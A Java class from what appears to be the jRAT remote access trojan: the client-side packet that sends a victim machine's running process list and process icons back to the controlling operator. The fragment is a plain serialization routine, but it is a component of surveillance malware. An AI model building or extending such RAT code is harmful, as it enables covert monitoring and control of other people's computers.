package jrat.module.process;

import jrat.client.Connection;
import jrat.client.packets.outgoing.OutgoingPacket;
import jrat.common.ProcessData;

import javax.imageio.ImageIO;
import java.io.ByteArrayOutputStream;


public class Packet25Process implements OutgoingPacket {

	private ProcessData processData;

	public Packet25Process(ProcessData processData) {
		this.processData = processData;
	}

	@Override
	public void write(Connection con) throws Exception {
		String[] data = processData.getData();
		
		assert data.length <= Byte.MAX_VALUE;

        con.writeByte(data.length);
		
		for (int i = 0; i < data.length; i++) {
            con.writeLine(data[i]);
		}
		
		boolean writeIcon = processData.getImage() != null;

        con.writeBoolean(writeIcon);
		if (writeIcon) {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			
			ImageIO.write(processData.getImage(), "png", baos);
			
			byte[] image = baos.toByteArray();
            con.writeInt(image.length);
            con.write(image);
		}
	}

	@Override
	public short getPacketId() {
		return 25;
	}

}
